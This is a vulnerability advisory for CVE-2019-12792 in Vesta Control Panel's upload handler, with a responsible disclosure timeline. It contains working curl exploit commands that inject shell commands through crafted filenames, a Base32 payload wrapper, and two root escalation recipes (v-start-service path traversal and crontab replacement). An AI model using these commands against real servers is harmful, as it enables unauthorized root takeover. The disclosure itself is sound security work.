---
title: '[CVE-2019-12792] Vesta Control Panel 0.9.8-24 — Privilege escalation in the upload handler'
description: Privilege escalation to root can be achieved by a regular user via the file upload handler exploiting an insufficient shell escaping mechanism.
tags: [CVE, Vesta Control Panel, Privilege escalation, upload]
advisory:
  discovered: 2019-03-15
  product: '[Vesta Control Panel](https://vestacp.com/)'
  versions:
    - 0.9.8-24
  cve: CVE-2019-12792
---

## Abstract

The insufficient shell escaping mechanism used during the invocation of the `exec` PHP function allows a registered user to run arbitrary system commands as the `admin` user, to whom VestaCP grants full access. A malicious registered user can thus escalate its privileges up to `root` by submitting a POST request to the web application.

[HestiaCP](https://www.hestiacp.com/) (an actively maintained fork of VestaCP) version 1.0.4 is also vulnerable but a fix has been promptly deployed in version 1.0.5.

## Details

The PHP script reachable at `/upload/UploadHandler.php` naively uses `'...'` to shell-escape the user input (instead of using `escapeshellarg`):

```php
exec (VESTA_CMD . "v-copy-fs-file ". USERNAME ." {$uploaded_file} '{$file_path}'", $output, $return_var);
```

The `$file_path` variable is controlled by the user as it corresponds to the name of the file being uploaded. By crafting a proper file name it is possible to escape the single quotes and *blindly* run additional commands as the `admin` user (the one that runs the web server in VestaCP).

For example, the following `curl` invocation uses the `sleep` command to prove the RCE success:

```console
$ PHPSESSID=... # grab it from an authenticated regular user session
$ time curl -sk -o /dev/null https://target.com:8083/upload/ \
    -b "PHPSESSID=$PHPSESSID" \
    -F "files=@/dev/null;filename=\"';sleep 5;#\""

real    0m5.097s
user    0m0.032s
sys     0m0.004s
```

Since the file name is filtered through the `basename` PHP function, the payload cannot contain `/`. Follows a more general solution that allows to execute arbitrary commands by using the Base32 encoding:

```console
$ COMMAND='[ -w ~admin/.bashrc ] && sleep 5'
$ PAYLOAD="$(echo "$COMMAND" | base32 -w0)"
$ time curl -sk -o /dev/null https://target.com:8083/upload/ \
    -b "PHPSESSID=$PHPSESSID" \
    -F "files=@/dev/null;filename=\"';echo $PAYLOAD | base32 -d | sh;#\""

real    0m5.087s
user    0m0.028s
sys     0m0.000s
```

The above also proves that is possible to write files in the `admin` home directory.

### From admin to root access

The `admin` user ultimately has full access to the target machine, yet VestaCP seems to make it hard for it to run superuser commands. For completeness, follows two possible ways to accomplish that.

#### Misusing the `v-start-service` command

The `service` system command provides a way to execute arbitrary executables and not only init scripts[^service]. Since `v-start-service` is a merely wrapper around `service`, it is possible to exploit it to run arbitrary executables as `root`.

Set the `COMMAND` variable as follows:

```console
$ COMMAND='
    echo "id >/usr/local/vesta/web/proof" >/tmp/x
    chmod +x /tmp/x
    sudo /usr/local/vesta/bin/v-start-service ../../tmp/x'
```

Run the remaining commands as above, then check that the proof file is created in the web server root:

```console
$ curl -k https://target.com:8083/proof
uid=0(root) gid=0(root) groups=0(root)
```

[^service]: See the [GTFOBins entry](https://gtfobins.github.io/gtfobins/service/).

#### Using cron

One simple way for the `admin` user to legitimately execute `root` commands is to replace the `/etc/crontab` file and restart the cron daemon using the `v-change-sys-service-config` VestaCP utility. Set the `COMMAND` variable as follows:

```console
$ COMMAND='
    echo "* * * * * root id >/usr/local/vesta/web/proof" >/tmp/x
    sudo /usr/local/vesta/bin/v-change-sys-service-config /tmp/x cron yes'
```

Run the remaining commands as above, then after one minute check that the proof file is created in the web server root:

```console
$ curl -k https://target.com:8083/proof
uid=0(root) gid=0(root) groups=0(root)
```

## Other instances of similar vulnerabilities

Several other instances of the same or similar problems have been found in the VestaCP source code. The following list[^git-tree] is a best-effort attempt to enumerate such instances, they are not tested and often are not exploitable in practice or not interesting since only the `admin` user can reach the code, but should nevertheless be fixed[^fixed]:

```php
// /usr/local/vesta/web/edit/mail/index.php:75
exec (VESTA_CMD."v-list-mail-account-autoreply ".$user." '".$v_domain."' '".$v_account."' json", $output, $return_var);

// /usr/local/vesta/web/edit/mail/index.php:231
exec (VESTA_CMD."v-delete-mail-account-alias ".$v_username." ".$v_domain." ".$v_account." '".$alias."'", $output, $return_var);

// /usr/local/vesta/web/edit/mail/index.php:257
exec (VESTA_CMD."v-delete-mail-account-forward ".$v_username." ".$v_domain." ".$v_account." '".$forward."'", $output, $return_var);

// /usr/local/vesta/web/edit/server/index.php:342
exec (VESTA_CMD."v-add-backup-host '". $v_backup_type ."' '". $v_backup_host ."' '". $v_backup_username ."' '". $v_backup_password ."' '". $v_backup_bpath ."'", $output, $return_var);

// /usr/local/vesta/web/edit/server/index.php:359
exec (VESTA_CMD."v-delete-backup-host '". $v_backup_type ."'", $output, $return_var);

// /usr/local/vesta/web/edit/server/index.php:367
exec (VESTA_CMD."v-add-backup-host '". $v_backup_type ."' '". $v_backup_host ."' '". $v_backup_username ."' '". $v_backup_password ."' '". $v_backup_bpath ."'", $output, $return_var);

// /usr/local/vesta/web/edit/server/index.php:389
exec (VESTA_CMD."v-add-backup-host '". $v_backup_type ."' '". $v_backup_host ."' '". $v_backup_username ."' '". $v_backup_password ."' '". $v_backup_bpath ."'", $output, $return_var);

// /usr/local/vesta/web/edit/server/index.php:406
exec (VESTA_CMD."v-delete-backup-host '". $v_backup_type ."'", $output, $return_var);

// /usr/local/vesta/web/edit/web/index.php:39
exec (VESTA_CMD."v-list-web-domain-ssl ".$user." '".$v_domain."' json", $output, $return_var);

// /usr/local/vesta/web/edit/web/index.php:142
exec (VESTA_CMD."v-list-dns-domain ".$v_username." '".$v_alias."' json", $output, $return_var);

// /usr/local/vesta/web/edit/web/index.php:145
exec (VESTA_CMD."v-change-dns-domain-ip ".$v_username." '".$v_alias."' ".$v_ip, $output, $return_var);

// /usr/local/vesta/web/edit/web/index.php:176
exec (VESTA_CMD."v-delete-web-domain-alias ".$v_username." ".$v_domain." '".$alias."' 'no'", $output, $return_var);

// /usr/local/vesta/web/edit/web/index.php:184
exec (VESTA_CMD."v-delete-dns-on-web-alias ".$v_username." ".$v_domain." '".$alias."' 'no'", $output, $return_var);

// /usr/local/vesta/web/edit/web/index.php:317
exec (VESTA_CMD."v-list-web-domain-ssl ".$user." '".$v_domain."' json", $output, $return_var);

// /usr/local/vesta/web/edit/web/index.php:370
exec (VESTA_CMD."v-add-letsencrypt-domain ".$user." ".$v_domain." '".$l_aliases."' 'no'", $output, $return_var);

// /usr/local/vesta/web/reset/mail/index.php:135
exec (VESTA_CMD."v-get-mail-account-value '".$v_user."' ".$v_domain." ".$v_account." 'md5'", $output, $return_var);

// /usr/local/vesta/web/reset/mail/index.php:154
exec (VESTA_CMD."v-change-mail-account-password '".$v_user."' ".$v_domain." ".$v_account." ".$v_new_password, $output, $return_var);
```

[^git-tree]: Locations refer to the Git commit [e1fb811caf73e5d8de49e3d2a0098a1afb0f647f](https://github.com/serghey-rodin/vesta/tree/e1fb811caf73e5d8de49e3d2a0098a1afb0f647f).

[^fixed]: Some of them (and others) are fixed in a subsequent [pull request](https://github.com/serghey-rodin/vesta/pull/1865/commits/0831a198b86a4760e83c0eaec78d84bab7098e6c).

## Timeline

2019-05-28
: Disclosed to the VestaCP team.

2019-06-10
: MITRE assigns [{{ page.advisory.cve }}](https://cve.mitre.org/cgi-bin/cvename.cgi?name={{ page.advisory.cve }}) to this vulnerability.

2019-07-29
: Final warning via [GitHub issue](https://github.com/serghey-rodin/vesta/issues/1921) since emails have been ignored.

2019-07-30
: The VestaCP author asks one more week to fix the issue and publish a new release.

2019-08-07
: The VestaCP team [fixes](https://github.com/serghey-rodin/vesta/commit/b17b4b205df0c01dada54d9684cfaa94b924064a) the vulnerability.

2019-08-15
: The VestaCP team [releases](https://github.com/serghey-rodin/vesta/commit/868dd8b146e76ea3c83c26855ae2f60b22d989d2) version 0.9.8-25.
